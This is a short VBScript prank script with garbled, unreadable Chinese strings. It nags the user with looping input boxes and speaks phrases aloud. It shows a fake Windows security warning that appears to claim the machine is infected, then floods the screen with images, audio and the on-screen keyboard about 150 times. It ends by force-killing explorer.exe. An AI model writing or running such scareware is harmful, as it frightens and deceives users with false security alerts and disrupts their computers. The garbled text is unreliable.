dim i,t,flag,z,g,y
g=1
g=int(g)
flag="1"
z=1
flag=int(flag)
z=int(z)
msgbox"Ϊ���ռ��û���Ϣ��ʹ��Ʒ��ø��ã����ǽ�����һ�����⣬ϣ�����ܻ�����ϣ�����"
t="������һ�����⣬����˧������˧�������û�����㣬��Ļش𽫻�Ӱ����һ��"
i=inputbox(t)
do while i<>"����" and i<>"��"
if z=1 then
i=inputbox("���������������ش�")
z=2
else
i=inputbox("��Ϲ����˵�����������������ش�")
end if
loop
if i="����"  then
msgbox"�ţ�����С���ӣ����۹Ⱑ��������֪����̫���ˣ�����"
elseif i="��" then
msgbox"�����û�����㰡���ٸ������һ�λ��ᣬ����ٲ�˵ʵ���Ļ�������Ը�"
i=inputbox("����˭˧")
end if
if i<>"����" then
msgbox("�������ˣ����һ�½�����Ҳû���ˣ������������˵����������˧��")
dim k
set k=createobject("sapi.spvoice")
k.speak "�������ˣ����һ�½�����Ҳû���ˣ������������˵����������˧��"
end if
do
msgbox("������Ҫ����Ļ��Ը������ǹز����ҵģ��ػ�Ҳû�ã����������˵����仰")
dim m
set m=createobject("sapi.spvoice")
m.speak "������˧��"
g=g+1
if g=4 then
msgbox"��֪��������˧�����ϲ������仰���������ܲ��ܲ�Ҫ�ٰ���ȥ�ˣ�û���õģ�������ٰ���ȥ�Ļ�����ĵ��Ի��в�����"
g=g+1
end if
if g=5 then
exit do
end if
loop
dim o
for o=1 to 3
msgBox"��ĵ����ⲡ���ƻ����Ƿ����޸�?" ,vbYesNo,"WINDOWS��ȫ����"
next
set y=createobject("wscript.shell")
y.run"d:\����\01.mp3"
dim p
set p=createobject("wscript.shell")
do while g<150
randomize
o=int((6*rnd)+1)
g=g+1
select case o
case 1
p.run "d:\����\1.jpg"
case 2
p.run "d:\����\2.jpg"
case 3
p.run "d:\����\3.jpg"
case 4
p.run "d:\����\4.jpg"
case 5
p.run "osk"
p.run "d:\����\5.jpg"
case 6
p.run"d:\����\6.jpg"
end select
loop
p.run "taskkill /f /im explorer.exe"